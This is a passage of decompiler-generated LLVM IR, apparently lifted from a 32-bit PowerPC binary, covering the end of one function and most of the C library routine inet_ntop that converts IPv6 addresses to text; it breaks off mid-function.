  %v1_1000f0a4 = add i32 %v0_1000f0a4, -1
  store i32 %v1_1000f0a4, i32* %ctr.global-to-local, align 4
  %v2_1000f0a4 = icmp eq i32 %v1_1000f0a4, 0
  br i1 %v2_1000f0a4, label %dec_label_pc_1000f0a8, label %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge

dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge: ; preds = %dec_label_pc_1000f070
  %v1_1000effc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000effc

dec_label_pc_1000f0a8:                            ; preds = %dec_label_pc_1000f070
  %v2_1000f0a8 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000f0a8, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000f0b0 = add i32 %v1_1000f0a0, %v2_1000f0a8
  store i32 %v2_1000f0b0, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f0a8, i32* @r3, align 4
  %v3_1000f0b8 = add i32 %v2_1000f0b0, -1
  %v4_1000f0b8 = inttoptr i32 %v3_1000f0b8 to i8*
  store i8 0, i8* %v4_1000f0b8, align 1
  %v0_1000f0bc = call i32 @__GI_strlen()
  store i32 %v0_1000f0bc, i32* %r3.global-to-local, align 4
  %v1_1000f0c0 = load i32, i32* @r30, align 4
  %v3_1000f0c0 = icmp ugt i32 %v0_1000f0bc, %v1_1000f0c0
  br i1 %v3_1000f0c0, label %dec_label_pc_1000f0c8, label %dec_label_pc_1000f0dc

dec_label_pc_1000f0c8:                            ; preds = %dec_label_pc_1000f0a8
  %v0_1000f0c8 = call i32 @__errno_location()
  store i32 %v0_1000f0c8, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000f0d4 = inttoptr i32 %v0_1000f0c8 to i32*
  store i32 28, i32* %v2_1000f0d4, align 4
  %v0_1000f0f0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0ec

dec_label_pc_1000f0dc:                            ; preds = %dec_label_pc_1000f0a8
  %v0_1000f0dc = load i32, i32* @r29, align 4
  store i32 %v0_1000f0dc, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f0a8, i32* %r4.global-to-local, align 4
  %v2_1000f0e4 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000f0e4 = call i32 @strcpy(i32 %v0_1000f0dc, i8* %v2_1000f0e4)
  store i32 %v3_1000f0e4, i32* %r3.global-to-local, align 4
  store i32 %v3_1000f0e4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f0ec

dec_label_pc_1000f0ec:                            ; preds = %dec_label_pc_1000f0c8, %dec_label_pc_1000f0dc
  %v0_1000f0f0 = phi i32 [ %v0_1000f0f0.pre, %dec_label_pc_1000f0c8 ], [ %v3_1000f0e4, %dec_label_pc_1000f0dc ]
  store i32 %v0_1000efa4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f0f0, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f0f0

; uselistorder directives
  uselistorder i32 %v0_1000f0f0, { 1, 0 }
  uselistorder i32 %v2_1000f0a8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000f0a4, { 1, 0 }
  uselistorder i32 %v2_1000f0a0, { 1, 0 }
  uselistorder i32 %v0_1000f074, { 1, 0, 2 }
  uselistorder i32 %v1_1000f038, { 1, 0, 2 }
  uselistorder i32 %v2_1000f028, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000f014, { 1, 0 }
  uselistorder i32 %v0_1000f000, { 1, 0 }
  uselistorder i32 %v0_1000f0a02, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 7, 8, 4, 5, 6, 2 }
  uselistorder i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), { 39, 40, 41, 5, 6, 7, 42, 43, 0, 44, 45, 8, 10, 11, 12, 13, 14, 15, 16, 9, 17, 2, 1, 18, 20, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 3, 46, 37, 4, 38 }
  uselistorder label %dec_label_pc_1000f0ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000f070, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000f104 = icmp slt i32 %arg1, 2
  %v3_1000f104 = icmp eq i32 %arg1, 2
  store i1 %v1_1000f104, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f104, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000f104, label %dec_label_pc_1000f134, label %dec_label_pc_1000f128

dec_label_pc_1000f128:                            ; preds = %entry
  %v1_1000f128 = icmp slt i32 %arg1, 10
  %v3_1000f128 = icmp eq i32 %arg1, 10
  store i1 %v1_1000f128, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f128, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f128, label %dec_label_pc_1000f16c.lr.ph, label %dec_label_pc_1000f380

dec_label_pc_1000f134:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000f144.689 to i32), i32* @lr, align 4
  %v3_1000f140 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000f378

dec_label_pc_1000f16c.lr.ph:                      ; preds = %dec_label_pc_1000f128
  %v2_1000f148 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000f148, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f15c.690 to i32), i32* @lr, align 4
  %v3_1000f158 = call i32 @__GI_memset(i32 %v2_1000f148, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000f18c15 = load i32, i32* @r27, align 4
  store i32 %v0_1000f18c15, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f16c

dec_label_pc_1000f16c:                            ; preds = %dec_label_pc_1000f16c.lr.ph, %dec_label_pc_1000f16c
  %v1_1000f180 = phi i32 [ 0, %dec_label_pc_1000f16c.lr.ph ], [ %v1_1000f190, %dec_label_pc_1000f16c ]
  %v0_1000f16c = phi i32 [ %v0_1000f18c15, %dec_label_pc_1000f16c.lr.ph ], [ %v0_1000f18c, %dec_label_pc_1000f16c ]
  %v0_1000f174 = phi i32 [ %v0_1000f18c15, %dec_label_pc_1000f16c.lr.ph ], [ %v2_1000f18c, %dec_label_pc_1000f16c ]
  %v1_1000f16c = phi i32 [ 0, %dec_label_pc_1000f16c.lr.ph ], [ %v0_1000f184, %dec_label_pc_1000f16c ]
  %v2_1000f16c = add i32 %v0_1000f16c, %v1_1000f16c
  %v3_1000f16c = inttoptr i32 %v2_1000f16c to i8*
  %v4_1000f16c = load i8, i8* %v3_1000f16c, align 1
  %v5_1000f16c = zext i8 %v4_1000f16c to i32
  %v1_1000f170 = add i32 %v1_1000f16c, 2
  store i32 %v1_1000f170, i32* %r11.global-to-local, align 4
  %v1_1000f174 = add i32 %v0_1000f174, 1
  %v2_1000f174 = inttoptr i32 %v1_1000f174 to i8*
  %v3_1000f174 = load i8, i8* %v2_1000f174, align 1
  %v4_1000f174 = zext i8 %v3_1000f174 to i32
  %v1_1000f178 = mul nuw nsw i32 %v5_1000f16c, 256
  %v2_1000f17c = or i32 %v4_1000f174, %v1_1000f178
  %v2_1000f180 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000f180 = add i32 %v2_1000f180, %v1_1000f180
  %v4_1000f180 = inttoptr i32 %v3_1000f180 to i32*
  store i32 %v2_1000f17c, i32* %v4_1000f180, align 4
  %v0_1000f184 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f184 = udiv i32 %v0_1000f184, 2
  %v0_1000f18c = load i32, i32* @r27, align 4
  %v2_1000f18c = add i32 %v0_1000f18c, %v0_1000f184
  store i32 %v2_1000f18c, i32* %r9.global-to-local, align 4
  %v1_1000f190 = mul i32 %v1_1000f184, 4
  %v0_1000f194 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f194 = add i32 %v0_1000f194, -1
  store i32 %v1_1000f194, i32* %ctr.global-to-local, align 4
  %v2_1000f194 = icmp eq i32 %v1_1000f194, 0
  br i1 %v2_1000f194, label %dec_label_pc_1000f1b4.lr.ph, label %dec_label_pc_1000f16c

dec_label_pc_1000f1b4.lr.ph:                      ; preds = %dec_label_pc_1000f16c
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f1b4

dec_label_pc_1000f1b4:                            ; preds = %dec_label_pc_1000f1b4.lr.ph, %dec_label_pc_1000f200
  %v0_1000f204 = phi i32 [ 8, %dec_label_pc_1000f1b4.lr.ph ], [ %v1_1000f204, %dec_label_pc_1000f200 ]
  %v0_1000f1f4 = phi i32 [ -1, %dec_label_pc_1000f1b4.lr.ph ], [ %v0_1000f1f442, %dec_label_pc_1000f200 ]
  %v0_1000f1e4 = phi i32 [ -1, %dec_label_pc_1000f1b4.lr.ph ], [ %v0_1000f1e439, %dec_label_pc_1000f200 ]
  %v0_1000f1b8 = phi i32 [ -1, %dec_label_pc_1000f1b4.lr.ph ], [ %v0_1000f1b835, %dec_label_pc_1000f200 ]
  %v0_1000f200 = phi i32 [ 0, %dec_label_pc_1000f1b4.lr.ph ], [ %v1_1000f200, %dec_label_pc_1000f200 ]
  %v1_1000f1b4 = mul i32 %v0_1000f200, 4
  %v3_1000f1b8 = icmp eq i32 %v0_1000f1b8, -1
  %v2_1000f1bc = add i32 %v1_1000f1b4, %v2_1000f148
  %v3_1000f1bc = inttoptr i32 %v2_1000f1bc to i32*
  %v4_1000f1bc = load i32, i32* %v3_1000f1bc, align 4
  %v3_1000f1c0 = icmp eq i32 %v4_1000f1bc, 0
  br i1 %v3_1000f1c0, label %dec_label_pc_1000f1c8, label %dec_label_pc_1000f1e0

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1b4
  br i1 %v3_1000f1b8, label %dec_label_pc_1000f1cc, label %dec_label_pc_1000f1d8

dec_label_pc_1000f1cc:                            ; preds = %dec_label_pc_1000f1c8
  store i32 %v0_1000f200, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f1d8:                            ; preds = %dec_label_pc_1000f1c8
  %v0_1000f1d8 = load i32, i32* @r31, align 4
  %v1_1000f1d8 = add i32 %v0_1000f1d8, 1
  store i32 %v1_1000f1d8, i32* @r31, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f1e0:                            ; preds = %dec_label_pc_1000f1b4
  br i1 %v3_1000f1b8, label %dec_label_pc_1000f200, label %dec_label_pc_1000f1e4

dec_label_pc_1000f1e4:                            ; preds = %dec_label_pc_1000f1e0
  %v3_1000f1e4 = icmp eq i32 %v0_1000f1e4, -1
  %v0_1000f1f8.pre = load i32, i32* @r31, align 4
  %v1_1000f1ec = load i32, i32* @r30, align 4
  %v3_1000f1ec = icmp sgt i32 %v0_1000f1f8.pre, %v1_1000f1ec
  %or.cond = or i1 %v3_1000f1e4, %v3_1000f1ec
  br i1 %or.cond, label %dec_label_pc_1000f1f4, label %dec_label_pc_1000f1fc

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1e4
  store i32 %v0_1000f1f4, i32* @r28, align 4
  store i32 %v0_1000f1f8.pre, i32* @r30, align 4
  br label %dec_label_pc_1000f1fc

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1e4, %dec_label_pc_1000f1f4
  %v0_1000f1e440 = phi i32 [ %v0_1000f1f4, %dec_label_pc_1000f1f4 ], [ %v0_1000f1e4, %dec_label_pc_1000f1e4 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f200:                            ; preds = %dec_label_pc_1000f1e0, %dec_label_pc_1000f1d8, %dec_label_pc_1000f1cc, %dec_label_pc_1000f1fc
  %v0_1000f1f442 = phi i32 [ %v0_1000f1f4, %dec_label_pc_1000f1e0 ], [ %v0_1000f1f4, %dec_label_pc_1000f1d8 ], [ %v0_1000f200, %dec_label_pc_1000f1cc ], [ -1, %dec_label_pc_1000f1fc ]
  %v0_1000f1b835 = phi i32 [ -1, %dec_label_pc_1000f1e0 ], [ %v0_1000f1b8, %dec_label_pc_1000f1d8 ], [ %v0_1000f200, %dec_label_pc_1000f1cc ], [ -1, %dec_label_pc_1000f1fc ]
  %v0_1000f1e439 = phi i32 [ %v0_1000f1e4, %dec_label_pc_1000f1e0 ], [ %v0_1000f1e4, %dec_label_pc_1000f1d8 ], [ %v0_1000f1e4, %dec_label_pc_1000f1cc ], [ %v0_1000f1e440, %dec_label_pc_1000f1fc ]
  %v1_1000f200 = add nuw nsw i32 %v0_1000f200, 1
  store i32 %v1_1000f200, i32* %r11.global-to-local, align 4
  %v1_1000f204 = add nsw i32 %v0_1000f204, -1
  store i32 %v1_1000f204, i32* %ctr.global-to-local, align 4
  %v2_1000f204 = icmp eq i32 %v1_1000f204, 0
  br i1 %v2_1000f204, label %dec_label_pc_1000f208, label %dec_label_pc_1000f1b4

dec_label_pc_1000f208:                            ; preds = %dec_label_pc_1000f200
  %v3_1000f208 = icmp eq i32 %v0_1000f1f442, -1
  %v1_1000f228 = icmp slt i32 %v0_1000f1e439, -1
  %v3_1000f228 = icmp eq i32 %v0_1000f1e439, -1
  store i1 %v1_1000f228, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f228, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f208, label %dec_label_pc_1000f228, label %dec_label_pc_1000f210

dec_label_pc_1000f210:                            ; preds = %dec_label_pc_1000f208
  %v0_1000f220.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000f228, label %dec_label_pc_1000f220, label %dec_label_pc_1000f218

dec_label_pc_1000f218:                            ; preds = %dec_label_pc_1000f210
  %v1_1000f218 = load i32, i32* @r30, align 4
  %v2_1000f218 = icmp slt i32 %v0_1000f220.pre, %v1_1000f218
  %v3_1000f218 = icmp sgt i32 %v0_1000f220.pre, %v1_1000f218
  %v4_1000f218 = icmp eq i32 %v0_1000f220.pre, %v1_1000f218
  store i1 %v2_1000f218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f218, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f218, label %dec_label_pc_1000f220, label %dec_label_pc_1000f228.thread

dec_label_pc_1000f220:                            ; preds = %dec_label_pc_1000f210, %dec_label_pc_1000f218
  store i32 %v0_1000f220.pre, i32* @r30, align 4
  store i32 %v0_1000f1f442, i32* @r28, align 4
  br label %dec_label_pc_1000f228.thread

dec_label_pc_1000f228.thread:                     ; preds = %dec_label_pc_1000f220, %dec_label_pc_1000f218
  %v0_1000f23076 = phi i32 [ %v1_1000f218, %dec_label_pc_1000f218 ], [ %v0_1000f220.pre, %dec_label_pc_1000f220 ]
  %v0_1000f228.ph = phi i32 [ %v0_1000f1e439, %dec_label_pc_1000f218 ], [ %v0_1000f1f442, %dec_label_pc_1000f220 ]
  %v1_1000f22859 = icmp slt i32 %v0_1000f228.ph, -1
  %v3_1000f22861 = icmp eq i32 %v0_1000f228.ph, -1
  store i1 %v1_1000f22859, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f22861, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f230

dec_label_pc_1000f228:                            ; preds = %dec_label_pc_1000f208
  br i1 %v3_1000f228, label %dec_label_pc_1000f23c, label %dec_label_pc_1000f228.dec_label_pc_1000f230_crit_edge

dec_label_pc_1000f228.dec_label_pc_1000f230_crit_edge: ; preds = %dec_label_pc_1000f228
  %v0_1000f230.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f230

dec_label_pc_1000f230:                            ; preds = %dec_label_pc_1000f228.dec_label_pc_1000f230_crit_edge, %dec_label_pc_1000f228.thread
  %v0_1000f230 = phi i32 [ %v0_1000f23076, %dec_label_pc_1000f228.thread ], [ %v0_1000f230.pre, %dec_label_pc_1000f228.dec_label_pc_1000f230_crit_edge ]
  %v0_1000f22862 = phi i32 [ %v0_1000f228.ph, %dec_label_pc_1000f228.thread ], [ %v0_1000f1e439, %dec_label_pc_1000f228.dec_label_pc_1000f230_crit_edge ]
  %v1_1000f230 = icmp slt i32 %v0_1000f230, 1
  %v2_1000f230 = icmp sgt i32 %v0_1000f230, 1
  %v3_1000f230 = icmp eq i32 %v0_1000f230, 1
  store i1 %v1_1000f230, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f230, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f230, label %dec_label_pc_1000f23c, label %dec_label_pc_1000f238

dec_label_pc_1000f238:                            ; preds = %dec_label_pc_1000f230
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000f23c

dec_label_pc_1000f23c:                            ; preds = %dec_label_pc_1000f230, %dec_label_pc_1000f228, %dec_label_pc_1000f238
  %v0_1000f2483 = phi i32 [ %v0_1000f22862, %dec_label_pc_1000f230 ], [ -1, %dec_label_pc_1000f228 ], [ -1, %dec_label_pc_1000f238 ]
  %v2_1000f23c = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000f23c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000f2484 = icmp slt i32 %v0_1000f2483, -1
  %v3_1000f2486 = icmp eq i32 %v0_1000f2483, -1
  store i1 %v1_1000f2484, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f2486, i1* %cr7_eq.global-to-local, align 1
  %v2_1000f2b8 = icmp slt i32 %tmp, 65535
  %v4_1000f2b8 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000f248

dec_label_pc_1000f248:                            ; preds = %dec_label_pc_1000f23c, %dec_label_pc_1000f314
  %v2_1000f284 = phi i32 [ %v2_1000f23c, %dec_label_pc_1000f23c ], [ %v2_1000f26c51, %dec_label_pc_1000f314 ]
  %v0_1000f258 = phi i32 [ %v0_1000f2483, %dec_label_pc_1000f23c ], [ %v0_1000f248, %dec_label_pc_1000f314 ]
  %v0_1000f278 = phi i32 [ 0, %dec_label_pc_1000f23c ], [ %v1_1000f314, %dec_label_pc_1000f314 ]
  %v3_1000f2487 = phi i1 [ %v3_1000f2486, %dec_label_pc_1000f23c ], [ %v3_1000f248, %dec_label_pc_1000f314 ]
  br i1 %v3_1000f2487, label %dec_label_pc_1000f278, label %dec_label_pc_1000f250

dec_label_pc_1000f250:                            ; preds = %dec_label_pc_1000f248
  %v2_1000f250 = icmp slt i32 %v0_1000f278, %v0_1000f258
  %v4_1000f250 = icmp eq i32 %v0_1000f278, %v0_1000f258
  br i1 %v2_1000f250, label %dec_label_pc_1000f278, label %dec_label_pc_1000f258

dec_label_pc_1000f258:                            ; preds = %dec_label_pc_1000f250
  %v1_1000f258 = load i32, i32* @r30, align 4
  %v2_1000f258 = add i32 %v1_1000f258, %v0_1000f258
  %v2_1000f25c = icmp slt i32 %v0_1000f278, %v2_1000f258
  %v4_1000f25c = icmp eq i32 %v0_1000f278, %v2_1000f258
  store i1 %v2_1000f25c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f25c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000f25c, label %dec_label_pc_1000f264, label %dec_label_pc_1000f278

dec_label_pc_1000f264:                            ; preds = %dec_label_pc_1000f258
  br i1 %v4_1000f250, label %dec_label_pc_1000f268, label %dec_label_pc_1000f314

dec_label_pc_1000f268:                            ; preds = %dec_label_pc_1000f264
  %v3_1000f26c = inttoptr i32 %v2_1000f284 to i8*
  store i8 58, i8* %v3_1000f26c, align 1
  %v0_1000f270 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f270 = add i32 %v0_1000f270, 1
  store i32 %v1_1000f270, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f314

dec_label_pc_1000f278:                            ; preds = %dec_label_pc_1000f258, %dec_label_pc_1000f250, %dec_label_pc_1000f248
  %v1_1000f278 = icmp slt i32 %v0_1000f278, 0
  %v3_1000f278 = icmp eq i32 %v0_1000f278, 0
  store i1 %v1_1000f278, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f278, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f278, label %dec_label_pc_1000f28c.thread, label %dec_label_pc_1000f28c

dec_label_pc_1000f28c.thread:                     ; preds = %dec_label_pc_1000f278
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000f2f0

dec_label_pc_1000f28c:                            ; preds = %dec_label_pc_1000f278
  %v3_1000f284 = inttoptr i32 %v2_1000f284 to i8*
  store i8 58, i8* %v3_1000f284, align 1
  %v0_1000f288 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f288 = add i32 %v0_1000f288, 1
  store i32 %v1_1000f288, i32* %r29.global-to-local, align 4
  %v0_1000f28c.pre = load i32, i32* @r31, align 4
  %v1_1000f28c = icmp slt i32 %v0_1000f28c.pre, 6
  %v3_1000f28c = icmp eq i32 %v0_1000f28c.pre, 6
  store i1 %v1_1000f28c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f28c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f28c, label %dec_label_pc_1000f294, label %dec_label_pc_1000f2f0

dec_label_pc_1000f294:                            ; preds = %dec_label_pc_1000f28c
  %v0_1000f294 = load i32, i32* @r28, align 4
  %v1_1000f294 = icmp slt i32 %v0_1000f294, 0
  %v3_1000f294 = icmp eq i32 %v0_1000f294, 0
  store i1 %v1_1000f294, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f294, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f294, label %dec_label_pc_1000f29c, label %dec_label_pc_1000f2f0

dec_label_pc_1000f29c:                            ; preds = %dec_label_pc_1000f294
  %v0_1000f29c = load i32, i32* @r30, align 4
  %v1_1000f29c = icmp slt i32 %v0_1000f29c, 6
  %v3_1000f29c = icmp eq i32 %v0_1000f29c, 6
  store i1 %v1_1000f29c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f29c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f29c, label %dec_label_pc_1000f2c0, label %dec_label_pc_1000f2a4

dec_label_pc_1000f2a4:                            ; preds = %dec_label_pc_1000f29c
  %v1_1000f2a4 = icmp slt i32 %v0_1000f29c, 5
  %v3_1000f2a4 = icmp eq i32 %v0_1000f29c, 5
  store i1 %v1_1000f2a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f2a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f2a4, label %dec_label_pc_1000f2ac, label %dec_label_pc_1000f2f0

dec_label_pc_1000f2ac:                            ; preds = %dec_label_pc_1000f2a4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000f2b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f2b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000f2b8, label %dec_label_pc_1000f2c0, label %dec_label_pc_1000f2f0

dec_label_pc_1000f2c0:                            ; preds = %dec_label_pc_1000f2ac, %dec_label_pc_1000f29c
  %v1_1000f2c0 = load i32, i32* @r1, align 4
  %v2_1000f2c0 = sub i32 %v1_1000f2c0, %v1_1000f288
  %v0_1000f2c4 = load i32, i32* @r27, align 4
  %v1_1000f2c4 = add i32 %v0_1000f2c4, 12
  %v1_1000f2c8 = add i32 %v2_1000f2c0, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000f2d4.691 to i32), i32* @lr, align 4
  %v3_1000f2d0 = call i32 @inet_ntop4(i32 %v1_1000f2c4, i32 %v1_1000f288, i32 %v1_1000f2c8)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000f2d8 = icmp slt i32 %v3_1000f2d0, 0
  %v3_1000f2d8 = icmp eq i32 %v3_1000f2d0, 0
  store i1 %v1_1000f2d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f2d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f2d8, label %dec_label_pc_1000f390, label %dec_label_pc_1000f2e0

dec_label_pc_1000f2e0:                            ; preds = %dec_label_pc_1000f2c0
  %v0_1000f2e0 = load i32, i32* @r29, align 4
  store i32 %v0_1000f2e0, i32* @r3, align 4
  %v0_1000f2e4 = call i32 @__GI_strlen()
  %v0_1000f2e8 = load i32, i32* @r29, align 4
  %v2_1000f2e8 = add i32 %v0_1000f2e8, %v0_1000f2e4
  store i32 %v2_1000f2e8, i32* %r29.global-to-local, align 4
  %v0_1000f328.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000f328

dec_label_pc_1000f2f0:                            ; preds = %dec_label_pc_1000f28c.thread, %dec_label_pc_1000f2ac, %dec_label_pc_1000f2a4, %dec_label_pc_1000f294, %dec_label_pc_1000f28c
  %v0_1000f2f067 = phi i32 [ 0, %dec_label_pc_1000f28c.thread ], [ 6, %dec_label_pc_1000f2ac ], [ 6, %dec_label_pc_1000f2a4 ], [ 6, %dec_label_pc_1000f294 ], [ %v0_1000f28c.pre, %dec_label_pc_1000f28c ]
  %v0_1000f2cc66 = phi i32 [ %v2_1000f284, %dec_label_pc_1000f28c.thread ], [ %v1_1000f288, %dec_label_pc_1000f2ac ], [ %v1_1000f288, %dec_label_pc_1000f2a4 ], [ %v1_1000f288, %dec_label_pc_1000f294 ], [ %v1_1000f288, %dec_label_pc_1000f28c ]
  %v1_1000f2f0 = mul i32 %v0_1000f2f067, 4
  store i32 %v2_1000f148, i32* %r9.global-to-local, align 4
  %v2_1000f2f8 = add i32 %v1_1000f2f0, %v2_1000f148
  %v3_1000f2f8 = inttoptr i32 %v2_1000f2f8 to i32*
  %v4_1000f2f8 = load i32, i32* %v3_1000f2f8, align 4
  store i32 %v0_1000f2cc66, i32* @r3, align 4
  store i32 268497680, i32* @lr, align 4
  %v5_1000f30c = load i32, i32* @r7, align 4
  %v6_1000f30c = load i32, i32* @r8, align 4
  %v9_1000f30c = call i32 @sprintf(i32 %v0_1000f2cc66, i32 ptrtoint ([3 x i8]* @global_var_1001396c.692 to i32), i32 %v4_1000f2f8, i32 %v2_1000f148, i32 %v5_1000f30c, i32 %v6_1000f30c, i32 %v2_1000f148, i32 ptrtoint (i32* @0 to i32))
  %v0_1000f310 = load i32, i32* @r29, align 4
  %v2_1000f310 = add i32 %v0_1000f310, %v9_1000f30c
  store i32 %v2_1000f310, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f314

dec_label_pc_1000f314:                            ; preds = %dec_label_pc_1000f264, %dec_label_pc_1000f268, %dec_label_pc_1000f2f0
  %v2_1000f26c51 = phi i32 [ %v2_1000f284, %dec_label_pc_1000f264 ], [ %v1_1000f270, %dec_label_pc_1000f268 ], [ %v2_1000f310, %dec_label_pc_1000f2f0 ]
  %v0_1000f314 = load i32, i32* @r31, align 4
  %v1_1000f314 = add i32 %v0_1000f314, 1
  store i32 %v1_1000f314, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000f314, 8
  %v0_1000f248 = load i32, i32* @r28, align 4
  %v1_1000f248 = icmp slt i32 %v0_1000f248, -1
  %v3_1000f248 = icmp eq i32 %v0_1000f248, -1
  store i1 %v1_1000f248, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f248, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000f248, label %dec_label_pc_1000f320

dec_label_pc_1000f320:                            ; preds = %dec_label_pc_1000f314
  br i1 %v3_1000f248, label %dec_label_pc_1000f340, label %dec_label_pc_1000f328

dec_label_pc_1000f328:                            ; preds = %dec_label_pc_1000f320, %dec_label_pc_1000f2e0
  %v2_1000f338 = phi i32 [ %v2_1000f26c51, %dec_label_pc_1000f320 ], [ %v2_1000f2e8, %dec_label_pc_1000f2e0 ]
  %v0_1000f328 = phi i32 [ %v0_1000f248, %dec_label_pc_1000f320 ], [ %v0_1000f328.pre, %dec_label_pc_1000f2e0 ]
  %v1_1000f328 = load i32, i32* @r30, align 4
  %v2_1000f328 = add i32 %v1_1000f328, %v0_1000f328
  %v1_1000f32c = icmp slt i32 %v2_1000f328, 8
  %v3_1000f32c = icmp eq i32 %v2_1000f328, 8
